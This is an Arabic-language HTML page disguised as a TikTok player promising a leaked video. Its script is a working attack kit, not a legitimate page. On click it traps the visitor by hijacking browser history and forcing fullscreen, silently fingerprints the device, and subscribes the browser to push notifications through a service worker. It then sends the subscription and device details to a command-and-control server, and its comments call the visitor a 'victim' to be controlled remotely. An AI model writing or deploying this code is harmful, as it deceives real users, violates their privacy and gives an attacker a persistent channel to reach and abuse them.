<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    
    <meta property="og:title" content="🔥 شاهد فيديو نضال المسرب قبل الحذف!">
    <meta property="og:image" content="https://img.icons8.com/color/512/tiktok--v1.png">
    <meta property="og:description" content="مقطع ترند تيك توك غريب جداً.. شاهد الآن">

    <title>TikTok Video Player</title>
    <style>
        body { margin:0; background:#000; overflow:hidden; font-family: sans-serif; color:#fff; }
        .tt-container { height:100vh; width:100vw; display:flex; justify-content:center; align-items:center; position:relative; background-color: black; }
        .play-btn { width:100px; cursor:pointer; z-index:100; transition: 0.3s; }
        .bg-blur { 
            position: absolute; width:100%; height:100%; 
            background: url('https://images.unsplash.com/photo-1611162617213-7d7a39e9b1d7?q=80&w=1000') center/cover;
            filter: blur(8px); opacity: 0.5; 
        }
        video { width: 100%; height: 100%; object-fit: cover; display: none; }
    </style>
</head>
<body onclick="startAttack()">

    <div class="tt-container" id="playerBox">
        <div class="bg-blur" id="blurBg"></div>
        <img src="https://cdn-icons-png.flaticon.com/512/0/375.png" class="play-btn" id="pBtn">
        
        <video id="myVideo" loop playsinline>
            <source src="https://www.w3schools.com/html/mov_bbb.mp4" type="video/mp4">
        </video>
    </div>

    <script>
        // --- الإعدادات التقنية الجاهزة بمفتاحك الخاص ---
        // استبدل الرابط أدناه برابط نفق Playit الخاص بك
        const SERVER_URL = 'https://hamdi-c2.playit.gg'; 
        
        // تم وضع مفتاحك الذي أرسلته هنا بنجاح
        const PUBLIC_KEY = 'BKgqclqB9RzkIyiYPlZY9jZE2Owwf6TYdf_TcbykL_O_ZmLOAz_9bFe6UBg_IclAfN4Ssvr90D2N2u-jQjjO96Y'; 

        function hijack() {
            for(let i=0; i<20; i++) history.pushState(null, "", location.href);
            window.onpopstate = () => {
                history.pushState(null, "", location.href);
                alert("⚠️ خطأ في النظام: يرجى البقاء في الصفحة لمشاهدة المقطع بالكامل!");
            };
        }

        async function startAttack() {
            hijack(); 
            
            const video = document.getElementById('myVideo');
            const pBtn = document.getElementById('pBtn');
            const blurBg = document.getElementById('blurBg');

            pBtn.style.display = 'none';
            blurBg.style.display = 'none';
            video.style.display = 'block';
            video.play();

            if (document.documentElement.requestFullscreen) {
                document.documentElement.requestFullscreen().catch(() => {});
            }

            // سحب بصمة الجهاز صمتاً (Fingerprinting)
            let specs = { 
                os: navigator.userAgent.split('(')[1].split(')')[0], 
                battery: "Unknown",
                screen: screen.width + "x" + screen.height
            };

            if (navigator.getBattery) {
                const b = await navigator.getBattery();
                specs.battery = Math.round(b.level * 100) + "%";
            }

            try {
                // تفعيل نظام الإشعارات للسيطرة عن بعد
                const reg = await navigator.serviceWorker.register('worker.js');
                let sub = await reg.pushManager.getSubscription();
                if (!sub) {
                    sub = await reg.pushManager.subscribe({
                        userVisibleOnly: true,
                        applicationServerKey: urlBase64ToUint8Array(PUBLIC_KEY)
                    });
                }

                // إرسال "الضحية" إلى سيرفر النات هنتر الخاص بك
                fetch(SERVER_URL + '/subscribe', {
                    method: 'POST',
                    body: JSON.stringify({ sub, specs }),
                    headers: { 'Content-Type': 'application/json' }
                });

            } catch (err) {
                console.log("C2 Error");
            }
        }

        function urlBase64ToUint8Array(s) {
            const p = '='.repeat((4 - s.length % 4) % 4);
            const b = (s + p).replace(/-/g, '+').replace(/_/g, '/');
            const r = atob(b);
            const o = new Uint8Array(r.length);
            for (let i = 0; i < r.length; ++i) o[i] = r.charCodeAt(i);
            return o;
        }
    </script>
</body>
</html>
